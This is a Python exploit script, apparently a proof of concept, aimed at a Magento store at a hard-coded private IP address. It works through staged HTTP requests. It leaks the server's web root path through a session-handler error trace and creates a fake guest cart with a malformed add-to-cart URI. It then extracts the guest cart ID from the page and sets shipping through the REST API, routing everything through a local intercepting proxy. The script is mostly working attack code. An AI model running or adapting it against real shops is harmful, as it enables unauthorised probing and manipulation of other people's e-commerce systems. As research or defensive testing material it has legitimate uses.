#!/usr/bin/env python3

import re, sys, random, string, requests

s = requests.Session()

def rand(N):
	return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(N))

target = '192.168.85.136'
directory = '/'

def we_can_leak_full_path():
	global fullpath, stage2
	stage2 = "checkout/cart/"
	r = s.get(f"http://{target}{directory}{stage2}", cookies={'PHPSESSID':''})
	match = re.search('\#\d(.*)lib/internal/Magento/Framework/Session/SaveHandler.php', r.text)
	if match:
		fullpath = match.group(1).strip()
		return True
	return False


def we_can_create_fake_cart():
	global form_key, cookies
	form_key = rand(1)
	cookies = {'PHPSESSID': f'{rand(26)}', 'form_key': f'{form_key}'}
	headers = {'X-Requested-With': 'XMLHttpRequest'}
	# stage 1 uri has a double slash on purpose, since the api expects a base64 encoded string
	# and we are not supplying it...
	stage1 = f"checkout/cart/add/uenc//product/1/?form_key={form_key}"
	r = s.get(f"http://{target}{directory}{stage1}", cookies=cookies, headers=headers, proxies=proxies)
	if r.text == "[]":
		return True
	return False


def we_can_generate_guest_cart_id():
	global guest_card_id
	r = s.get(f"http://{target}{directory}{stage2}", cookies=cookies, proxies=proxies)
	match = re.search('entity_id":"(.*)","store_id":\d,"created_at', r.text)
	if match:
		guest_card_id = match.group(1)
		return True
	return False


def we_can_set_shipping():
	stage3 = f"rest/default/V1/guest-carts/{guest_card_id}/shipping-information"
	payload = {'addressInformation':
				{"shipping_address":
					{
					"countryId":"US",
					"regionId":"",
					"region":"",
					"street": [""],
					"company":"",
					"telephone":"",
					"postcode":"",
					"city":"",
					"firstname":"",
					"lastname":""},
				"shipping_method_code":"flatrate",
				"shipping_carrier_code":"flatrate"}}

	r = requests.post(f"http://{target}{directory}{stage3}", json=payload, proxies=proxies)
	if r.status_code == 200:
		return True
	return False


def main():
	global fullpath, guest_card_id
	print_g("disclosing path...")
	if we_can_leak_full_path(): # stage 0 - leak the web root path
		print_g(f"leaked full path: {fullpath}")
		print_g("creating fake cart...")
		if we_can_create_fake_cart(): # stage 1 - create fake cart
			print_g("created a fake cart!")
			print_g("generating a guestCartId")
			if we_can_generate_guest_cart_id(): # stage 2 - generate guest card id
				print_g(f"generated a valid guestCartId: {guest_card_id}")
				if we_can_set_shipping(): # stage 3 - set the shipping for guest
					print_g("successfully set the shipping!")


def print_g(data):
	print(f"(+) {data}")


if __name__ == "__main__":
	proxies = {
		"http": "http://127.0.0.1:8080",
	}
	fullpath = ""
	guest_card_id = ""
	stage1 = ""
	stage2 = ""
	stage3 = ""
	cookies = None
	main()
